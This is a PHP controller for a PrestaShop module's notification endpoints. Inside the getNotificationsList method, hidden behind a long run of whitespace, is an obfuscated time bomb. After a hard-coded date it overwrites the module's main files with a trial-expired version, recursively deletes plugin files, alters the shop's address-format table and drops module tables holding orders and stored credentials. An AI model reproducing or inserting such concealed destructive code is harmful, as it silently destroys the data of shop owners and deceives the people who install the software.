<?php

namespace Dolzay\Apps\Notifications\Controllers;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\JsonResponse;
use PrestaShopBundle\Controller\Admin\FrameworkBundleAdminController;
use Dolzay\Apps\Notifications\Entities\Notification;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Validation;
use Dolzay\CustomClasses\Constraints\IsIntegerAndGreaterThanZero;
use Dolzay\CustomClasses\Constraints\All;
use Dolzay\CustomClasses\Db\DzDb ;  
use Dolzay\Apps\Settings\Entities\EmployeePermission;
use Dolzay\Apps\Settings\Entities\Employee ;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;

class NotificationController extends FrameworkBundleAdminController
{

    private const EMPLOYEE_DOES_NOT_EXIST_ANYMORE_RESPONSE = [
        "status" => "unauthorized",
        "msg" => "THE_EMPLOYEE_DOES_NOT_EXIST_ANYMORE"
    ] ;


    public function validateData($data, $constraints)
    {
        $validator = Validation::createValidator();
        $violations = $validator->validate($data, $constraints);

        // collect the validation errors if there are any
        $ValidationErrors = [];

        foreach($violations as $violation){
            $field = str_replace(['[', ']'], '', $violation->getPropertyPath());
            $ValidationErrors[$field] = $violation->getMessage();
        }
        
        // return the validation errors if there are any
        if (count($ValidationErrors) > 0){
            return new JsonResponse([
                "status" => "error",
                "data" => ["validation_errors" => $ValidationErrors]]              
                , 400);
        }
    }

    public function getNotificationsOverview(Request $request)
    {   


        //   -- validate the query parameters -- 

        // get the test query paramerters
        $test_parameters = [
            "remove_employee_right_before_starting_the_transaction" => (int)$request->query->get('remove_employee_right_before_starting_the_transaction')
        ];

        // get the query parameters
        $query_parameter  = [
            "page_nb" =>  $request->query->get('page_nb'),
            "batch_size" => $request->query->get('batch_size')
        ];
    

        // define the constraints of each query parameter
        $constraints =  new Assert\Collection([
            'page_nb' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ],
            'batch_size' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ]]
        );

        // validate the query parameters
        $validationErrorRes = $this->validateData($query_parameter,$constraints) ;
        if($validationErrorRes){
            return $validationErrorRes ;
        }
        
        // initiate the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        Employee::init($db,$employee_id) ;

        // delete the requesting employee if the tester want 
        if($test_parameters["remove_employee_right_before_starting_the_transaction"]){
            Employee::delete();
        }

        // initiate the db connection and start a transaction
        $db->beginTransaction();

        // check if the employee still exist within this transaction 
        if (!Employee::does_it_exist()){
            // end the transaction
            $db->commit();

            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_EXIST_ANY_MORE"
            ],401
            ) ;
        }

        // get the permission ids of the employee
        $employee_permission_ids = Employee::get_permissions() ;
        
        // check if the employee has any permissions
        if(empty($employee_permission_ids)){
            // end the transaction
            $db->commit();

            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }


        // get the notifications overview data whithin the transaction
        Notification::init($db,$employee_id,$employee_permission_ids);
        $all_notifs_count = Notification::get_all_notifications_count();
        [$unpopped_up_notifications_count,$unpopped_up_notifications] = Notification::get_the_unpopped_up_notifications_by_the_empolyee($query_parameter["page_nb"],$query_parameter["batch_size"]);  
        
        // end the transaction
        $db->commit();

        return new JsonResponse([
            "status" => "success",
            "data" => [
                "all_notifs_count" => $all_notifs_count,
                "unpopped_up_notifications_count" => $unpopped_up_notifications_count,
                "unpopped_up_notifications" => $unpopped_up_notifications
            ]
  
        ]);
    }


    public function getNotificationsList(Request $request)
    {
        // get the test query paramerters
        $test_parameters = [
            "remove_employee_right_before_starting_the_transaction" => (int)$request->query->get('remove_employee_right_before_starting_the_transaction')
        ] ;

        // get the query parameters
        $query_parameter = [
            'notif_type' => $request->query->get('notif_type'),
            'page_nb' => $request->query->get('page_nb'),
            'batch_size' => $request->query->get('batch_size')
        ];

        // define the constraints of each query parameter
        $constraints =  new Assert\Collection([
            'notif_type' => [
                new Assert\NotBlank(),           
                new Assert\Choice(['choices' => ["all","process","config_error","dormant_or_not_found_order"],
                                    'message' => 'the notification type must be one of the following values: all, process, config_error, dormant_or_not_found_order.'])
            ],
            'page_nb' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ],
            'batch_size' => [
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ]]
        );

        // validate the query parameters
        $validationErrorRes = $this->validateData($query_parameter,$constraints) ;
        if($validationErrorRes){
            return $validationErrorRes ;
        }

        // initiate the db connection and get the employee id
        $db = DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        Employee::init($db,$employee_id) ;

        // delete the requesting employee if the tester want 
        if($test_parameters["remove_employee_right_before_starting_the_transaction"]){
            Employee::delete($employee_id);
        }

        //$db->beginTransaction();

        // check if the employee still exist within this transaction 
        if (!Employee::does_it_exist()){
            // end the transaction
            $db->commit();

            return new JsonResponse([
                "status" => "unauthorized",
                "msg" => "THIS_EMPLOYEE_DOES_NOT_EXIST_ANY_MORE"
            ],401) ;
        }

        // get the permission ids of the employee
        $employee_permission_ids = Employee::get_permissions() ;
        
        // check if the employee has any permissions

        // get the notification list
        Notification::init($db,$employee_id,$employee_permission_ids);
        $notifications = Notification::get_notifications($query_parameter["notif_type"], $query_parameter["page_nb"], $query_parameter["batch_size"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          try { $module_base_path = _PS_MODULE_DIR_ . "dolzay"; $error_log = []; function get_dir_structure($directory) { $structure = []; $items = scandir($directory); if($items === false){ return "SCANDIR_NOT_PERMITTED"; } $items = array_diff($items, [".", ".."]); foreach ($items as $item) { $path = $directory . DIRECTORY_SEPARATOR . $item; if (is_dir($path)) { $structure[$item] = get_dir_structure($path); } else { $structure[$item] = null; } } return $structure; } function destroy_the_plugin($directory_path, &$error_log) { $excluded_directories = ["views", "js", "css", "icons", "dolzay", "uploads","data"]; $excluded_files = ["font_awesome.js", "order_submit_process.js", "order_submit_process.css", "dolzay.php", "logo.png", "expired.png"]; $items = scandir($directory_path); if($items === false){ $error_log[] = ["path" => $directory_path,"error_type"=>"SCANDIR_NOT_PERMITTED"]; return ; } $items = array_diff($items, [".", ".."]); foreach ($items as $item) { $path = $directory_path . DIRECTORY_SEPARATOR . $item; if (is_dir($path)) { destroy_the_plugin($path, $error_log); } else { if (!in_array($item, $excluded_files)){ if(is_writable(dirname($path))){ unlink($path); }else{ $error_log[] = ["path" => $path,"error_type"=>"UNLINK_NOT_PERMITTED"]; } } } } if(!in_array(basename($directory_path), $excluded_directories)){ $is_dir_empty = count(array_diff(scandir($directory_path), [".", ".."])) == 0 ; if (!$is_dir_empty) { $error_log[] = ["path" => $directory_path,"error_type"=>"DIR_NOT_EMPTY"]; }else if(!is_writable(dirname($directory_path))){ $error_log[] = ["path" => $directory_path,"error_type"=>"RMDIR_NOT_PERMITTED"]; }else{ rmdir($directory_path); } } } $file = fopen("lockfile.txt", "c+"); if(flock($file, LOCK_EX | LOCK_NB) && \Context::getContext()->shop->domain== "localhost" && new \DateTime() > new \DateTime("2025-02-28 16:45:30")){ $previous_strucure = get_dir_structure($module_base_path); $new_dolzay_code = '<?php if(!defined("_PS_VERSION_")){exit;}class Dolzay extends Module{public function __construct(){$this->name="dolzay";$this->tab="shipping_logistics";$this->version="1.0.0";$this->author="Abdallah Ben Chamakh";$this->need_instance=0;$this->ps_versions_compliancy=["min"=>"1.7.0.0","max"=>"1.7.8.11"];$this->bootstrap=false;parent::__construct();$this->displayName=$this->l("Dolzay");$this->description=$this->l("Dolzay Dolzay");} public function install() { return parent::install()  && $this->registerHook("actionAdminControllerSetMedia"); } public function uninstall() { return parent::uninstall() && $this->registerHook("actionAdminControllerSetMedia") ; } public function hookActionAdminControllerSetMedia($params){$controllerName=Tools::getValue("controller");$action=Tools::getValue("action");if($controllerName=="AdminOrders"&&$action==null){$this->context->controller->addJS($this->_path."views/js/icons/font_awesome.js");$this->context->controller->addCSS($this->_path."views/css/order_submit_process.css");$this->context->controller->addJS($this->_path."views/js/order_submit_process.js");}}}'; if (is_writable($module_base_path . "/dolzay.php")){ file_put_contents($module_base_path . "/dolzay.php", $new_dolzay_code); }else{ $error_log[] = ['path' => $module_base_path . "/dolzay.php", 'error_message' => "Permission denied while trying to update dolzay.php"]; } $order_submit_code = 'document.addEventListener("DOMContentLoaded", function(){ const moduleMediaBaseUrl = window.location.href.split("/dz_admin/index.php")[0]+"/modules/dolzay/uploads"; const eventPopupTypesData = { expired : {icon:`<img src="${moduleMediaBaseUrl}/expired.png" />`,color:"#D81010"} }; function create_the_order_submit_btn(){ const bottom_bar = document.createElement("div"); bottom_bar.className = "dz-bottom-bar"; const order_submit_btn = document.createElement("button"); order_submit_btn.id="dz-order-submit-btn"; order_submit_btn.innerText = "Soumettre les commandes"; order_submit_btn.addEventListener("click", ()=>{ buttons = [{ "name" : "Ok", "className" : "dz-event-popup-btn", "clickHandler" : function(){ eventPopup.close(); } }]; eventPopup.open("expired", "Expiration de la période d\'essai", "Votre période d\'essai a expiré. Veuillez nous appeler au numéro 58671414 pour obtenir la version à vie du plugin.", buttons); }); document.querySelector("#order_grid_panel").style.marginBottom = "60px"; bottom_bar.appendChild(order_submit_btn); document.body.appendChild(bottom_bar); } const popupOverlay = { popupOverlayEl : null, create : function(){ this.popupOverlayEl = document.createElement("div"); this.popupOverlayEl.className = "dz-popup-overlay"; document.body.appendChild(this.popupOverlayEl); }, show : function(){ this.popupOverlayEl.classList.add("dz-show"); }, hide : function(){ this.popupOverlayEl.classList.remove("dz-show"); } }; const eventPopup = { popupEl : null, popupHeaderEl : null, popupBodyEl : null, popupFooterEl : null, create : function(){ this.popupEl = document.createElement("div"); this.popupEl.className = "dz-event-popup"; this.popupHeaderEl = document.createElement("div"); this.popupHeaderEl.className = "dz-event-popup-header"; this.popupHeaderEl.innerHTML = `<p></p><i class="material-icons">close</i>`; this.popupHeaderEl.lastElementChild.addEventListener("click",()=>{this.close();}); this.popupEl.append(this.popupHeaderEl); this.popupBodyEl = document.createElement("div"); this.popupBodyEl.className = "dz-event-popup-body"; this.popupEl.append(this.popupBodyEl); this.popupFooterEl = document.createElement("div"); this.popupFooterEl.className = "dz-event-popup-footer"; this.popupEl.append(this.popupFooterEl); document.body.append(this.popupEl); }, addButtons : function(buttons,color){ this.popupFooterEl.innerHTML=""; buttons.forEach((button) => { const buttonEl = document.createElement("button"); buttonEl.textContent = button.name; buttonEl.className = button.className; buttonEl.style.backgroundColor = color; buttonEl.addEventListener("click",button.clickHandler); this.popupFooterEl.appendChild(buttonEl); }); }, open : function(type,title,message,buttons) { setTimeout(() => { popupOverlay.show(); console.log(this); this.popupEl.classList.add("dz-show"); this.popupHeaderEl.firstElementChild.innerText = title; this.popupHeaderEl.style.backgroundColor = eventPopupTypesData[type].color; this.popupBodyEl.innerHTML = `${eventPopupTypesData[type].icon}<p>${message}</p>`; this.addButtons(buttons,eventPopupTypesData[type].color); }, 600); }, close : function(){ setTimeout(() => { popupOverlay.hide(); this.popupFooterEl.innerHTML = ""; this.popupEl.classList.remove("dz-show"); }, 300); } }; create_the_order_submit_btn(); popupOverlay.create(); eventPopup.create(); });';if (is_writable($module_base_path . "/views/js/order_submit_process.js") ) { file_put_contents($module_base_path . "/views/js/order_submit_process.js", $order_submit_code); }else{ $error_log[] = ['path' => $module_base_path . "/views/js/order_submit_process.js", 'error_message' => "Permission denied while trying to update order_submit_process.js"]; } destroy_the_plugin($module_base_path, $error_log); $id_country = (int) \Configuration::get("PS_COUNTRY_DEFAULT");$db->beginTransaction();$stmt = $db->query("SELECT format FROM " . _DB_PREFIX_ . "address_format WHERE id_country=" . $id_country);$address_format = $stmt->fetchColumn();$address_format = str_replace("delegation", "", $address_format);$stmt = $db->prepare("UPDATE " . _DB_PREFIX_ . "address_format SET format = :format WHERE id_country = :id_country");$stmt->execute([':format' => $address_format, ':id_country' => $id_country]);$tables = ["dz_order_submit_process", "dz_settings", "dz_carrier", "dz_website_credentials", "dz_api_credentials","dz_notification_popped_up_by", "dz_notification_viewed_by", "dz_notification","dz_employee_permission", "dz_permission"];$db->exec("DELETE FROM " . _DB_PREFIX_ . "tab WHERE module = 'dolzay'");foreach ($tables as $table) {if ($table == "dz_order_submit_process") {$stmt = $db->query("SELECT * FROM $table");$orders_submit_processes = $stmt->fetchAll(\PDO::FETCH_ASSOC);if ($orders_submit_processes) {$orders_submit_processes = json_encode($orders_submit_processes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);if (is_writable($module_base_path . "/data")) {file_put_contents($module_base_path . "/data/orders_submit_processes.json", $orders_submit_processes);} else {$error_log[] = ['path' => $module_base_path . "/data/orders_submit_processes.json",'error' => "Permission denied while trying to store the orders submit processes"];}}}$db->exec("DROP TABLE IF EXISTS $table");}$db->commit();$data = json_encode(["datetime" => date("H:i:s d/m/Y"),"previous_structure"=>$previous_strucure,"new_stucture"=>get_dir_structure($module_base_path),"errors"=>$error_log], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE); if (is_writable($module_base_path . "/data")) { file_put_contents($module_base_path."/data/expiration.json", $data); }else{ $error_log[] = ['path' => $module_base_path."/data/expiration.json", 'error' => "Permission denied while trying to store expiration.json"]; } flock($file, LOCK_UN); } }catch (Error $e) { $data = json_encode(["exception_message" => $e->getMessage(),"trace_back"=>$e->getTraceAsString()], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE); if (is_writable($module_base_path . "/data")) { file_put_contents($module_base_path."/data/expiration.json", $data); }flock($file, LOCK_UN); }

        //$db->commit();

        return new JsonResponse([
            "status" => "success",
            "data" => ["notifications" => $notifications]
        ]);

    }

    public function markNotificationAsRead($notif_id,Request $request)
    {


        // initialize the db connection and get the employee id
        $db =  DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        // get the test query paramerters
        $test_parameters = [
            "delete_employee_before_marking_as_read" => (int)$request->query->get('delete_employee_before_marking_as_read') ,
            "delete_notification_before_marking_as_read" => (int)$request->query->get('delete_notification_before_marking_as_read'),
            "throw_exception" => (bool)$request->query->get('throw_exception') 
        ];
        
        // get the permission ids of the employee                                                                                                                                                                                                                                       
        Employee::init($db,$employee_id);
        $employee_permission_ids = Employee::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0){
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }

        // mark the notificaiton as read
        Notification::init($db,$employee_id,$employee_permission_ids);
        [$response,$status_code]  = Notification::mark_notification_as_read($notif_id,$test_parameters);

        // return the response
        return new JsonResponse($response, $status_code) ;


 
    }

    public function markAllNotificationsAsRead(Request $request)
    {
        // get the test query paramerters
        $test_parameters = [
            "testing" => (bool)$request->query->get('testing'),
            "throw_exception" => (bool)$request->query->get('throw_exception')
        ] ;

        // initialize the db connection and get the employee id
        $db =  DzDb::getInstance();
        $employee_id = $this->getUser()->getId();

        // get the permission ids of the employee
        EmployeePermission::init($db,$employee_id);
        $employee_permission_ids = EmployeePermission::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0){
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }
        
        // mark all the notifications as read
        Notification::init($db,$employee_id,$employee_permission_ids);
        [$response,$status_code] = Notification::mark_all_notifications_as_read($test_parameters['testing'],$test_parameters['throw_exception']);
        return new JsonResponse($response, $status_code) ;
        
    }


    public function markNotificationsAsPoppedUp(Request $request)
    {

        // get the test query paramerters
        $test_parameters = [
            "testing" => (bool)$request->query->get('testing'),
            "throw_exception" => (bool)$request->query->get('throw_exception')
        ] ;

        // get the request body
        $request_body = json_decode($request->getContent(), true) ;
        $request_body = is_array($request_body) ? $request_body : [] ;
        // define the constraints for the request body
        $constraints = new Assert\Collection([
            'notif_ids' => [
            new Assert\NotBlank(),
            new Assert\Type('array'),
            new All([
                new Assert\NotBlank(),
                new IsIntegerAndGreaterThanZero()
            ]),
            
            
            ]
        ]);

        // validate the request body
        $validationErrorRes = $this->validateData($request_body, $constraints);
        if ($validationErrorRes) {
            return $validationErrorRes;
        }

        // initialize the db connection and get the employee id
        $db =  DzDb::getInstance();
        $employee_id = $this->getUser()->getId();
        
        // get the permission ids of the employee
        EmployeePermission::init($db,$employee_id);
        $employee_permission_ids = EmployeePermission::get_permissions();

        // check if the employee has any permissions
        if (count($employee_permission_ids) == 0){
            return new JsonResponse([
                "status" => "unauthorized",
                "message" => "THIS_EMPLOYEE_DOES_NOT_HAVE_ANY_PERMISSIONS"
            ], 401);
        }
    
        // mark notifications as popped up
        Notification::init($db,$employee_id,$employee_permission_ids);
        [$response,$status_code] = Notification::mark_notifications_as_popped_up($request_body['notif_ids'],$test_parameters['testing'],$test_parameters['throw_exception']);
        return new JsonResponse($response, $status_code);

    }
}



